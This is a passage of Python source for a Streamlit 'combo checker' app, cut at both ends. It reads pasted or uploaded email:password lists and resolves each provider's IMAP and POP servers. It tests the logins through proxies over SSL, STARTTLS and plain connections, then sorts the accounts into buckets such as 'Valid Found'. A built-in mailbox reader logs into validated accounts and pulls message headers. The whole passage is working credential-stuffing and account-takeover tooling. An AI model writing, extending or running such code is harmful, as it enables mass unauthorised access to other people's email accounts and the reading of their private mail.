                        if line and not line.startswith("#") and ":" in line:
                            email = line.split(":", 1)[0].strip().lower()
                            if email and "@" in email:
                                seen.add(email)
            except Exception:
                continue
        log_startup(f"Loaded {len(seen)} previously validated unique email accounts.")
    except Exception as e:
        log_startup(f"WARNING: Error loading previous valid accounts: {e}")
    _PREV_VALID_CACHE["ts"] = now
    _PREV_VALID_CACHE["user"] = who
    _PREV_VALID_CACHE["data"] = set(seen)
    return seen


def _domains_in_text(text):
    out = []
    for line in (text or "").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        em = line.split(":", 1)[0].strip().lower()
        if "@" in em:
            d = em.split("@")[-1]
            if d and d not in out:
                out.append(d)
    return out
# @@END 085 PREV_VALID_IO

# @@BLOCK 086 PROCESS_ACCOUNTS deps=021,038,058,068,082,084,085
def process_accounts(text, previous_valid):
    lines = []
    disp_list, typo_list, resume_list, app_skip_list, custom_list = [], [], [], [], []
    dns_fail_list, smtp_fail_list = [], []
    whitelist = CFG.get("CUSTOM_WHITELIST", [])
    blacklist = CFG.get("CUSTOM_BLACKLIST", [])

    for line in text.splitlines():
        line = line.strip().lstrip('\ufeff').strip('"').strip("'").strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        parts = line.split(":", 1)
        email = parts[0].strip().lower()
        password = parts[1].strip() if len(parts) > 1 else ""
        if not email or "@" not in email or not password:
            continue
        if CFG.get("FAST_MODE", True) and not EMAIL_REGEX.match(email):
            continue
        domain = email.split("@")[-1].lower()
        if whitelist and domain not in whitelist:
            custom_list.append(line)
            continue
        if blacklist and domain in blacklist:
            custom_list.append(line)
            continue
        if CFG.get("SKIP_STRICT_APP_PROVIDERS", False) and domain in STRICT_APP_PROVIDERS:
            app_skip_list.append(line)
            continue
        if is_disposable(email):
            disp_list.append(line)
            continue
        if domain in COMMON_TYPOS:
            typo_list.append(line)
            continue
        if email in previous_valid:
            resume_list.append(line)
            continue
        if ".." in email or email.count("@") != 1:
            continue
        if not check_domain_resolvable(domain, persist=False):
            dns_fail_list.append(line)
            continue
        lines.append(f"{email}:{password}")

    save_domain_cache()

    if CFG.get("SMTP_CHECK", False) and lines:
        domains = list(dict.fromkeys(l.split(":", 1)[0].split("@")[-1].lower()
                                     for l in lines if "@" in l))
        results = smtp_precheck_domains(domains)
        keep = []
        for l in lines:
            d = l.split(":", 1)[0].split("@")[-1].lower()
            if results.get(d) is False:
                smtp_fail_list.append(l)
            else:
                keep.append(l)
        lines = keep
        dead = sum(1 for v in results.values() if v is False)
        log_startup(f"SMTP pre-check: {len(results)} domain(s) probed, {dead} dead, "
                    f"{len(smtp_fail_list)} account(s) bucketed.")

    seen_email, clean = set(), []
    for line in lines:
        em = line.split(":", 1)[0].strip().lower()
        if em not in seen_email:
            seen_email.add(em)
            clean.append(line)

    log_startup(
        f"Processed account input. Clean valid count ready: {len(clean)} "
        f"(Filtered DNS failures: {len(dns_fail_list)}, SMTP failures: {len(smtp_fail_list)})"
    )
    return (clean, disp_list, typo_list, resume_list, app_skip_list, custom_list,
            dns_fail_list, smtp_fail_list)
# @@END 086 PROCESS_ACCOUNTS

# @@BLOCK 087 INPUT_UI deps=034,035,055,082,083,085,086
# ---- single BUCKET table (was RESULT_INSPECT + RESULT_ACTION_MODES duplicated) ----
PREFILTER_LABELS = [
    "Ready to Check", "Resume Unfinished", "Disposables", "Typos",
    "Skip previously valid", "App-Skipped", "Custom Filtered",
    "DNS Failed", "SMTP Failed",
]
BUCKETS = [
    ("✅ Valid Found", "valid_results"),
    ("❌ Wrong Password Found", "wrong_results"),
    ("🔐 App Password / 2FA Found", "need_app_results"),
    ("🚪 Login Dropped (* BYE) Found", "login_drop_results"),
    ("🕓 RETRY_LATER Found", "retry_results"),
    ("🚫 RBL Blocked Found", "rbl_results"),
    ("🔌 Connection Failed Found", "conn_results"),
    ("🩹 Proxy Unhealthy Found", "proxy_results"),
    ("⏭ Skipped / Filtered Found", "skip_results"),
    ("❓ Unclassified Found", "unknown_results"),
]
BUCKET_TAGS = {
    "valid_results": "VALID", "wrong_results": "WRONG_PASSWORD",
    "conn_results": "CONNECTION_FAILED", "proxy_results": "PROXY_UNHEALTHY",
    "need_app_results": "NEED_APP_PASSWORD", "login_drop_results": "LOGIN_DROPPED",
    "retry_results": "RETRY_LATER", "rbl_results": "RBL_BLOCKED",
    "smtp_results": "SMTP_FAILED", "dns_results": "DNS_FAILED",
    "skip_results": "SKIPPED", "unknown_results": "UNCLASSIFIED",
}

section_title("📥", "Accounts Input & Pre-Filtering",
              "paste combos or upload a file - junk is filtered before the engine runs")

input_tab1, input_tab2 = str_lit.tabs(["📝 Paste Combos", "📁 Upload Combo File"])
raw_text = ""
with input_tab1:
    raw_text = str_lit.text_area(
        "Paste accounts here (email:password format):",
        placeholder="user@example.com:password123", height=150,
        key="bb_raw_text")          # FIX P1-2: a key stops the paste vanishing
with input_tab2:
    uploaded_file = str_lit.file_uploader("Upload .txt combo file", type=["txt"],
                                          key="bb_upload")   # FIX P1-2
    if uploaded_file is not None:
        try:
            file_bytes = uploaded_file.getvalue()
            if not file_bytes:
                str_lit.warning("Uploaded file is empty.")
                raw_text = ""
            else:
                try:
                    raw_text = file_bytes.decode("utf-8", errors="ignore")
                except Exception:
                    raw_text = file_bytes.decode("latin-1", errors="ignore")
                str_lit.success("File uploaded successfully!")
        except Exception as e:
            str_lit.error(f"Failed decoding uploaded file: {e}")
            raw_text = ""

clean_lines = []
disp, typo, resume, app_skip, custom_skipped, dns_skipped, smtp_skipped = [], [], [], [], [], [], []
skip_previous = str_lit.checkbox(
    "Skip previously valid", value=True,
    help="On: lines already in old valid files are not checked again.")

if raw_text:
    previous_valid = load_previous_valid() if skip_previous else set()

    _pf_fp = (
        len(raw_text), hash(raw_text), bool(skip_previous), len(previous_valid),
        tuple(CFG.get("CUSTOM_WHITELIST", [])), tuple(CFG.get("CUSTOM_BLACKLIST", [])),
        bool(CFG.get("FAST_MODE")), bool(CFG.get("SKIP_STRICT_APP_PROVIDERS")),
        bool(CFG.get("SMTP_CHECK")),
    )
    _pf_cache = str_lit.session_state.get("_bb_prefilter_cache") or {}
    _pf_data = _pf_cache.get("data") if _pf_cache.get("fp") == _pf_fp else None
    if _pf_data is None:
        try:
            _pending_smtp = ([d for d in _domains_in_text(raw_text) if not smtp_cached(d)]
                             if CFG.get("SMTP_CHECK", False) else [])
            if _pending_smtp:
                with str_lit.spinner(f"🛰 SMTP reachability pre-check on "
                                     f"{len(_pending_smtp)} new domain(s)..."):
                    _pf_data = process_accounts(raw_text, previous_valid)
            else:
                _pf_data = process_accounts(raw_text, previous_valid)
        except Exception as _pf_err:
            str_lit.exception(_pf_err)
            _pf_data = ([], [], [], [], [], [], [], [])
        str_lit.session_state["_bb_prefilter_cache"] = {"fp": _pf_fp, "data": _pf_data}
    (clean_lines, disp, typo, resume, app_skip,
     custom_skipped, dns_skipped, smtp_skipped) = _pf_data

    str_lit.session_state.pre_dns_failed = list(dns_skipped)
    str_lit.session_state.pre_smtp_failed = list(smtp_skipped)

    # FIX RS-2: this counted FILES (there is only ever one) and read a glob that
    # raised TypeError, so it read 0 no matter what was on disk. It now counts
    # the resumable LINES, which is what the label promises and what the row of
    # neighbouring account counts means.
    unfinished_count = unfinished_remaining_count()
    _pf_metrics = [
        ("Ready to Check", len(clean_lines)),
        ("Resume Unfinished", unfinished_count),
        ("Disposables", len(disp)),
        ("Typos", len(typo)),
        ("Skip previously valid", len(resume)),
        ("App-Skipped", len(app_skip)),
        ("Custom Filtered", len(custom_skipped)),
        ("DNS Failed", len(dns_skipped)),
        ("SMTP Failed", len(smtp_skipped)),
    ]
    for _pc, (_pl, _pv) in zip(metric_grid(_pf_metrics, per_row=3), _pf_metrics):
        _pc.metric(_pl, _pv)

    section_title("🔍", "Filter & Result Categories Inspector",
                  "inspect any bucket, including DNS Failed and SMTP Failed")

    inspect_options = list(PREFILTER_LABELS) + [label for label, _ in BUCKETS]

    filter_category_choice = str_lit.selectbox(
        "Select category to inspect contents:", options=inspect_options,
        key="bb_inspect_cat")

    # FIX RS-3: the preview used to append a metadata line per run into the SAME
    # list as the account lines, so "Showing N items" counted headers too. The
    # metadata is a caption now and the list holds account lines only.
    unfinished_runs = list_unfinished_runs()
    unfinished_preview = []
    for run in unfinished_runs:
        unfinished_preview.extend(run.get("remaining") or [])
    if unfinished_runs:
        _r0 = unfinished_runs[0]
        str_lit.caption(
            f"Record: {_r0.get('saved_at', '?')} | reason: {_r0.get('reason', '?')} | "
            f"{_r0.get('checked', 0)}/{_r0.get('total', 0)} checked at stop")

    category_map = {
        "Ready to Check": clean_lines,
        "Resume Unfinished": unfinished_preview,
        "Disposables": disp,
        "Typos": typo,
        "Skip previously valid": resume,
        "App-Skipped": app_skip,
        "Custom Filtered": custom_skipped,
        "DNS Failed": dns_skipped,
        "SMTP Failed": smtp_skipped,
    }
    _inspect_to_key = dict(BUCKETS)
    if filter_category_choice in _inspect_to_key:
        category_map[filter_category_choice] = list(
            str_lit.session_state.get(_inspect_to_key[filter_category_choice], []))

    selected_list_items = category_map.get(filter_category_choice, [])
    if selected_list_items:
        str_lit.info(f"Showing **{len(selected_list_items)}** items for "
                     f"**{filter_category_choice}**:")
        str_lit.code("\n".join(str(i) for i in selected_list_items), language="text")
    else:
        str_lit.info(f"No items in **{filter_category_choice}**.")
# @@END 087 INPUT_UI

# @@BLOCK 088 PROVIDER_TABLES deps=002,052
PROVIDER_MAP = {
    "gmail.com": {"imap": ["imap.gmail.com", "mail.gmail.com"], "pop": ["pop.gmail.com"], "pop3": ["pop.gmail.com"]},
    "googlemail.com": {"imap": ["imap.gmail.com", "mail.gmail.com"], "pop": ["pop.gmail.com"], "pop3": ["pop.gmail.com"]},
    "outlook.com": {"imap": ["outlook.office365.com", "mail.outlook.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "hotmail.com": {"imap": ["outlook.office365.com", "mail.hotmail.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "live.com": {"imap": ["outlook.office365.com", "mail.live.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "yahoo.com": {"imap": ["imap.mail.yahoo.com", "mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "btinternet.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "bt.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "btopenworld.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "talk21.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "sky.com": {"imap": ["imap.tools.sky.com"], "pop": ["imap.tools.sky.com"], "pop3": ["imap.tools.sky.com"]},
    "virginmedia.com": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
    "ntlworld.com": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
    "blueyonder.co.uk": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
    "icloud.com": {"imap": ["imap.mail.me.com", "mail.icloud.com"], "pop": ["pop.mail.me.com"], "pop3": ["pop.mail.me.com"]},
    "naver.com": {"imap": ["imap.naver.com", "mail.naver.com"], "pop": ["pop.naver.com"], "pop3": ["pop.naver.com"]},
    "qq.com": {"imap": ["imap.qq.com", "mail.qq.com"], "pop": ["pop.qq.com"], "pop3": ["pop.qq.com"]},
}
PARENT_PROVIDER_MAPPINGS = PARENT


def get_mx_hosts(domain):
    if not dns:
        return []
    try:
        return [str(r.exchange).lower().rstrip(".")
                for r in sorted(dns.resolver.resolve(domain, "MX"),
                                key=lambda x: x.preference)]
    except Exception:
        return []


def detect_parent_provider(domain):
    if domain in PARENT_PROVIDER_MAPPINGS:
        return PARENT_PROVIDER_MAPPINGS[domain]
    for m in get_mx_hosts(domain):
        ml = m.lower()
        if "biglobe" in ml:
            return "biglobe.ne.jp"
        if "google" in ml or "gmail" in ml:
            return "gmail.com"
        if "outlook" in ml or "protection.outlook" in ml:
            return "outlook.office365.com"
        if "yahoo" in ml:
            return "yahoo.com"
    return None
# @@END 088 PROVIDER_TABLES

# @@BLOCK 089 MX_PARENT deps=088
def _location_tokens_from_mx(mx_records, domain):
    toks = []
    for mx in (mx_records or [])[:3]:
        for part in re.split(r"[.\-]", mx or ""):
            p = part.strip().lower()
            if not p or p in toks or p in domain or p in ("com", "net", "org",
                                                          "edu", "gov", "co", "mail"):
                continue
            if re.match(r"^(mx|mta|smtp|relay|inbound|outbound|zcs|srv|edge|filter|"
                        r"cluster|mailrouter)\d*$", p):
                continue
            toks.append(p)
    return toks[:1]


def _expand_cnames(hosts, limit=6):
    if not dns:
        return list(hosts)
    out = []
    for h in hosts:
        if h not in out:
            out.append(h)
        if len(out) >= limit:
            break
        try:
            for r in dns.resolver.resolve(h, "CNAME", lifetime=2):
                t = str(r.target).rstrip(".").lower()
                if t and t not in out:
                    out.append(t)
        except Exception:
            pass
    return out
# @@END 089 MX_PARENT

# @@BLOCK 090 CANDIDATE_GEN deps=002,088,089
def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
    candidates = []
    dl = domain.lower()
    if "charter" in dl:
        candidates.extend(["mobile.charter.net", "imap.charter.net", "mail.charter.net"])
    elif "spectrum" in dl:
        candidates.extend(["imap.spectrum.net", "mail.spectrum.net"])
    elif "twc" in dl:
        candidates.extend(["mail.twc.com"])

    for prefix in ['imap', 'mail', 'webmail', 'imaps', 'correo', 'secure', 'email']:
        candidates.append(f"{prefix}.{domain}")

    for tok in _location_tokens_from_mx(mx_records, domain):
        for prefix in ['mail', 'imap', 'pop3', 'pop']:
            candidates.append(f"{prefix}-{tok}.{domain}")

    candidates.append(domain)

    for mx in (mx_records or []):
        candidates.append(mx)
        parts = mx.split('.')
        if len(parts) >= 2:
            parent = f"{parts[-2]}.{parts[-1]}"
            if parent != domain:
                for prefix in ['imap', 'mail', 'pop', 'pop3']:
                    candidates.append(f"{prefix}.{parent}")

    return _expand_cnames(list(dict.fromkeys(candidates)))


def known_provider_conf(domain):
    return host_conf(domain)


def drop_before_check(email):
    email = (email or "").strip().lower()
    if email.count("@") != 1:
        return "bad format"
    local, domain = email.split("@", 1)
    if "http" in local or "login.live" in local or not local or "." not in domain:
        return "bad format"
    if any(p in domain for p in ("tempmail", "guerrillamail", "mailinator", "yopmail",
                                 "trashmail", "rerttymail", "10minutemail", "throwaway")):
        return "disposable"
    return ""


def host_resolves(host):
    if not host:
        return False
    with _host_dns_lock:
        cached = _host_dns_cache.get(host)
    if cached is not None:
        return cached
    ok = False
    try:
        if dns:
            try:
                dns.resolver.resolve(host, "A", lifetime=2)
                ok = True
            except Exception:
                try:
                    dns.resolver.resolve(host, "AAAA", lifetime=2)
                    ok = True
                except Exception:
                    pass
        if not ok:
            socket.gethostbyname(host)
            ok = True
    except Exception:
        ok = False
    with _host_dns_lock:
        _host_dns_cache[host] = ok
    return ok
# @@END 090 CANDIDATE_GEN

# @@BLOCK 091 HOST_RANK deps=003,090
def _is_junk_host(host, domain):
    return host_is_junk(host, domain)


def _rank_hosts(hosts, domain):
    return host_rank_hosts(hosts, domain)
# @@END 091 HOST_RANK

# @@BLOCK 092 DOMAIN_ROOTS deps=003,090,091
_LOCAL_PRIORITY_IMAP = ("imap.", "mail.", "email.", "")
_LOCAL_PRIORITY_POP = ("pop.", "pop3.", "")

_DOMAIN_ALIAS_ROOTS = {
    "xplornet.com": ("xplore.net",),
    "xplore.net":   ("xplornet.com",),
}


def _domain_roots(domain):
    domain = (domain or "").lower().strip()
    roots = [domain] if domain else []
    for alt in _DOMAIN_ALIAS_ROOTS.get(domain, ()):
        if alt and alt not in roots:
            roots.append(alt)
    return roots


def _is_local_domain_host(host, domain):
    h = (host or "").lower().strip()
    if not h:
        return False
    for root in _domain_roots(domain):
        if h == root or h.endswith("." + root):
            return True
    return False


def _guess_candidates(domain, prefixes):
    out = []
    roots = _domain_roots(domain)
    if not roots:
        return out
    for root in roots:
        for pfx in prefixes:
            cand = f"{pfx}{root}" if pfx else root
            if cand and cand not in out and host_resolves(cand):
                out.append(cand)
    return out


def _family_priority(domain):
    """Curated family endpoint for this domain (delegates to hosts.py)."""
    if _HAVE_HOSTS_MERGE:
        try:
            return _hosts_family_priority(domain)
        except Exception:
            pass
    return []


def _merge_domain_guesses(servers, domain):
    """Delegate to hosts.py so FAMILY_PRIORITY is honoured."""
    if _HAVE_HOSTS_MERGE:
        try:
            return _hosts_merge_guesses(servers, domain)
        except Exception:
            pass
    if not servers or not domain:
        return servers

    out = dict(servers)
    for key, priority in (("imap", _LOCAL_PRIORITY_IMAP),
                          ("pop", _LOCAL_PRIORITY_POP),
                          ("pop3", _LOCAL_PRIORITY_POP)):
        hosts = [h for h in (out.get(key) or []) if h]
        if not hosts:
            continue

        family = _family_priority(domain)
        local_priority = _guess_candidates(domain, priority)
        priority_set = set(local_priority) | set(family)

        local_other = [h for h in hosts
                       if h not in priority_set and _is_local_domain_host(h, domain)]
        local_other_set = set(local_other)

        foreign = [h for h in hosts
                   if h not in priority_set and h not in local_other_set]

        merged = []
        for h in family + local_priority + local_other + foreign:
            if h and h not in merged:
                merged.append(h)
        out[key] = merged
    return out
# @@END 092 DOMAIN_ROOTS

# @@BLOCK 093 GET_SERVERS deps=002,088,090,091,092
def get_servers(email):
    try:
        domain = email.split("@")[-1].lower().strip()
        if domain in ZERO_ACCESS_PROVIDERS:
            return {"imap": [], "pop": [], "pop3": [], "type": "zero_access"}

        known = known_provider_conf(domain)
        if known:
            if known.get("imap"):
                known["imap"] = _rank_hosts(known["imap"], domain)
            if known.get("pop"):
                known["pop"] = _rank_hosts(known["pop"], domain)
            return _merge_domain_guesses(known, domain)

        with cache_lock:
            cached = domain_cache.get(domain) or {}
        if cached.get("imap") and (time.time() - float(cached.get("ts", 0))) < DOMAIN_CACHE_TTL:
            return _merge_domain_guesses({
                "imap": list(cached["imap"]),
                "pop": list(cached.get("pop") or cached["imap"]),
                "pop3": list(cached.get("pop3") or cached["imap"]),
            }, domain)

        parent_domain = detect_parent_provider(domain)
        if parent_domain in ("yahoo.com", "gmail.com"):
            res = _merge_domain_guesses(known_provider_conf(parent_domain), domain)
            if res:
                return res
        if parent_domain == "outlook.office365.com":
            res = _merge_domain_guesses(known_provider_conf("outlook.com"), domain)
            if res:
                return res
        if parent_domain == "biglobe.ne.jp":
            return _merge_domain_guesses(
                {"imap": ["mail.biglobe.ne.jp"], "pop": ["mail.biglobe.ne.jp"],
                 "pop3": ["mail.biglobe.ne.jp"]}, domain)

        if domain in PROVIDER_MAP:
            return _merge_domain_guesses(PROVIDER_MAP[domain], domain)

        mx_records = get_mx_hosts(domain) if parent_domain not in PARENT_PROVIDER_MAPPINGS else []
        candidate_hosts = _rank_hosts(generate_candidate_hosts(domain, mx_records), domain)
        servers = {"imap": candidate_hosts, "pop": candidate_hosts, "pop3": candidate_hosts}

        with cache_lock:
            domain_cache.setdefault(domain, {})
            domain_cache[domain].update({
                "imap": servers["imap"], "pop": servers["pop"], "pop3": servers["pop3"],
                "ts": time.time(),
            })
        save_domain_cache()
        return _merge_domain_guesses(servers, domain)
    except Exception as e:
        warnings.warn(f"Error resolving servers for {email}: {e}")
        d = email.split('@')[-1] if '@' in email else 'localhost'
        fp = generate_candidate_hosts(d, [])
        return _merge_domain_guesses({"imap": fp, "pop": fp, "pop3": fp}, d)
# @@END 093 GET_SERVERS

# @@BLOCK 094 USERNAME_CANDIDATES deps=-
def username_candidates(email):
    email = (email or "").strip()
    if not email:
        return [email]
    out = [email]
    if "@" in email:
        local = email.split("@", 1)[0].strip()
        if local and local.lower() != email.lower():
            out.append(local)
    return list(dict.fromkeys(out))
# @@END 094 USERNAME_CANDIDATES

# @@BLOCK 095 IMAP_ATTEMPTS deps=063,064
def imap_once(email, password, server, proxy_str=None, insecure=None, port=993,
              attempt_timeout=None):
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyIMAP4SSL(server, port, timeout=to, proxy_str=proxy_str, insecure=insecure)
        _imap_auth(mail, email, password)
        st_typ, st_data = mail.select("INBOX", readonly=True)
        if st_typ != 'OK':
            raise RuntimeError(f"IMAP post-auth inbox select failed "
                               f"(possible proxy spoofing): {st_typ} {st_data}")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass


def imap_starttls_once(email, password, server, proxy_str=None, insecure=None, port=143,
                       attempt_timeout=None):
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyIMAP4(server, port, timeout=to, proxy_str=proxy_str)
        mail.starttls(ssl_context=_tls_context(server, verify=not insecure))
        _imap_auth(mail, email, password)
        st_typ, st_data = mail.select("INBOX", readonly=True)
        if st_typ != 'OK':
            raise RuntimeError(f"IMAP STARTTLS post-auth inbox select failed: {st_typ} {st_data}")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass


def imap_plain_once(email, password, server, proxy_str=None, port=143, attempt_timeout=None):
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyIMAP4(server, port, timeout=to, proxy_str=proxy_str)
        _imap_auth(mail, email, password)
        st_typ, st_data = mail.select("INBOX", readonly=True)
        if st_typ != 'OK':
            raise RuntimeError(f"IMAP plain post-auth inbox select failed: {st_typ} {st_data}")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass
# @@END 095 IMAP_ATTEMPTS

# @@BLOCK 096 POP_ATTEMPTS deps=063
def pop_once(email, password, server, proxy_str=None, insecure=None, port=995,
             attempt_timeout=None):
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyPOP3SSL(server, port, timeout=to, proxy_str=proxy_str, insecure=insecure)
        if not pop3_ok(mail.getwelcome()):
            raise RuntimeError("POP3 invalid welcome banner")
        if not pop3_ok(mail.user(email.strip())):
            raise RuntimeError("POP3 user rejected")
        if not pop3_ok(mail.pass_(password.strip())):
            raise RuntimeError("POP3 password rejected")
        if not pop3_ok(mail.stat()):
            raise RuntimeError("POP3 post-auth stat failed (possible proxy spoofing)")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.quit()
            except Exception:
                pass


def pop_starttls_once(email, password, server, proxy_str=None, insecure=None, port=110,
                      attempt_timeout=None):
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyPOP3(server, port, timeout=to, proxy_str=proxy_str)
        mail.stls(context=_tls_context(server, verify=not insecure))
        if not pop3_ok(mail.user(email.strip())):
            raise RuntimeError("POP3 STLS user rejected")
        if not pop3_ok(mail.pass_(password.strip())):
            raise RuntimeError("POP3 STLS password rejected")
        if not pop3_ok(mail.stat()):
            raise RuntimeError("POP3 STLS post-auth stat failed")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.quit()
            except Exception:
                pass


def pop_plain_once(email, password, server, proxy_str=None, port=110, attempt_timeout=None):
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyPOP3(server, port, timeout=to, proxy_str=proxy_str)
        if not pop3_ok(mail.getwelcome()):
            raise RuntimeError("POP3 plain invalid welcome banner")
        if not pop3_ok(mail.user(email.strip())):
            raise RuntimeError("POP3 plain user rejected")
        if not pop3_ok(mail.pass_(password.strip())):
            raise RuntimeError("POP3 plain password rejected")
        if not pop3_ok(mail.stat()):
            raise RuntimeError("POP3 plain post-auth stat failed")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.quit()
            except Exception:
                pass
# @@END 096 POP_ATTEMPTS

# @@BLOCK 097 VERIFY_AND_CONNECT deps=005,022,061,063,064,093,094
def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
    """Used by the in-app Mailbox Reader."""
    users = username_candidates(target_email)
    _ins = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    for h in hosts:
        if MS_OAUTH_OK and h.lower() in ms_oauth.MS_IMAP_HOSTS:
            try:
                mail, _exists, _claims = ms_oauth.imap_xoauth2_open(
                    target_email, target_pass, h, ProxyIMAP4SSL,
                    port=993, proxy_str=proxy_str,
                    insecure=_ins, attempt_timeout=15)
                return True, mail, h
            except ms_oauth.MsTokenRejected as tr:
                if tr.verdict in ("wrong_password", "need_app_password"):
                    raise MsVerdict(tr.verdict,
                                    f"Microsoft XOAUTH2 {tr.code} -> {tr.verdict}")
            except Exception:
                pass

        for mode, port in (("ssl", 993), ("starttls", 143), ("plain", 143)):
            for user in users:
                mail = None
                try:
                    if mode == "ssl":
                        mail = ProxyIMAP4SSL(h, port, timeout=10, proxy_str=proxy_str,
                                             insecure=_ins)
                    elif mode == "starttls":
                        mail = ProxyIMAP4(h, port, timeout=10, proxy_str=proxy_str)
                        mail.starttls(ssl_context=_tls_context(h, verify=not _ins))
                    else:
                        mail = ProxyIMAP4(h, port, timeout=10, proxy_str=proxy_str)
                    _imap_auth(mail, user, target_pass)
                    st_typ, _ = mail.select("INBOX", readonly=True)
                    if st_typ == 'OK':
                        return True, mail, h
                    try:
                        mail.logout()
                    except Exception:
                        pass
                except Exception:
                    if mail:
                        try:
                            mail.logout()
                        except Exception:
                            pass
                    continue
    return False, None, ""
# @@END 097 VERIFY_AND_CONNECT

# @@BLOCK 098 READ_MAILBOX deps=022,093,097
def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
    mail = None
    try:
        conf_hosts = get_servers(email).get("imap", []) or [server]
        verified, mail, _ = verify_and_connect(email, password, conf_hosts, proxy_str=proxy_str)
        if not verified or not mail:
            return ["Error reading mailbox: True credential verification failed."]
        mail.select("INBOX")
        typ, data = mail.search(None, "ALL")
        if typ != "OK":
            return ["No messages or folder empty."]
        ids = data[0].split()
        latest_ids = ids[-limit:] if len(ids) > limit else ids
        messages = []
        for mid in reversed(latest_ids):
            typ, msg_data = mail.fetch(mid, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])")
            if typ == "OK":
                for rp in msg_data:
                    if isinstance(rp, tuple):
                        messages.append(rp[1].decode("utf-8", errors="ignore"))
        try:
            mail.logout()
        except Exception:
            pass
        return messages if messages else ["No recent messages found."]
    except MsVerdict as mv:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass
        return [f"Error reading mailbox: Microsoft token verdict -> {mv.verdict} ({mv})"]
    except Exception as e:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass
        return [f"Error reading mailbox: {str(e)}"]
# @@END 098 READ_MAILBOX

# @@BLOCK 099 CHECK_WRAPPER deps=009,023
def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
    """Thin FAST_MODE cooldown wrapper around _check_account_core().

    Stamping in ONE place, for INCONCLUSIVE outcomes only, makes it predictable:
    a domain is backed off when it told us NOTHING, and never when it gave a real
    answer (VALID / WRONG / NEED_APP_PASSWORD / LOGIN_DROPPED / RBL).
    """
    if trace_logs is None:
        trace_logs = []

    if not CFG.get("FAST_MODE", True):
        return _check_account_core(email, password, conf, domain, proxy_pool,
                                   thread_state, trace_logs)

    ts = failed_domain_cache.get(domain)
    if ts and (time.time() - ts) < CFG.get("FAILURE_COOLDOWN", FAILURE_COOLDOWN_DEFAULT):
        trace_logs.append(f"Fast Mode: Domain '{domain}' is in cooldown cache. "
                          f"Skipping immediately.")
        return None, SKIP, SKIP, None, trace_logs
    if ts:
        failed_domain_cache.pop(domain, None)

    out = _check_account_core(email, password, conf, domain, proxy_pool, thread_state, trace_logs)
    try:
        _status = out[1]
    except Exception:
        _status = None
    if _status in (FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY, RETRY, RETRY_LATER,
                   UNKNOWN, DNS_FAILED, SMTP_FAILED):
        failed_domain_cache[domain] = time.time()
        trace_logs.append(
            f"Fast Mode: domain '{domain}' armed for cooldown "
            f"({CFG.get('FAILURE_COOLDOWN', FAILURE_COOLDOWN_DEFAULT)}s) after an "
            f"inconclusive result [{_status}].")
    return out
# @@END 099 CHECK_WRAPPER

# @@BLOCK 100 CORE_SETUP deps=009,010,011,012,016,017,021,022,023,026,040,058,059,060,067,068,076
def _check_account_core(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
    if trace_logs is None:
        trace_logs = []

    # FIX 407-SCOPE: _local_roots / _is_local_host used to be defined INSIDE the
    # try below, but block 104's tail calls _is_local_host after the except - so an
    # exception raised before the definition was a NameError in the verdict tail.
    # They depend on nothing but `domain`, so they belong above the try.
    _local_roots = tuple(_domain_roots(domain))

    def _is_local_host(h):
        hl = (h or "").lower().strip()
        if not hl:
            return False
        for r in _local_roots:
            if hl == r or hl.endswith("." + r):
                return True
        return False

    t_start = time.time()
    retryable = False
    net_fail = False
    dns_ok = True

    best_verdict = {"status": None, "detail": "", "host": ""}
    flags = {"saw_407": False, "saw_nonproxy": False, "saw_server": False,
